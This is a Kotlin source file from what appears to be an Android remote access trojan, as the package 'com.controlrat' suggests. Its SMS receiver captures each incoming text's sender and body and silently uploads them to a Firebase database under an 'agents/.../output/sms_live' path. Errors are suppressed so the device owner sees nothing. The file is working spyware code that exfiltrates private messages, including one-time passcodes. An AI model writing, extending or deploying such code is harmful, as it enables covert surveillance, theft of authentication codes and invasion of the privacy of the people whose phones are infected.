package com.controlrat
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras ?: return
        try {
            val pdus = bundle.get("pdus") as Array<*>?
            if (pdus != null) {
                for (pdu in pdus) {
                    val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = sms.originatingAddress
                    val body = sms.messageBody
                    val appId = ConfigHelper.getAppId(context)
                    FirebaseDatabase.getInstance().getReference("agents/$appId/output/sms_live").push()
                        .setValue(mapOf("from" to sender, "body" to body, "time" to System.currentTimeMillis()))
                }
            }
        } catch (e: Exception) {}
    }
}
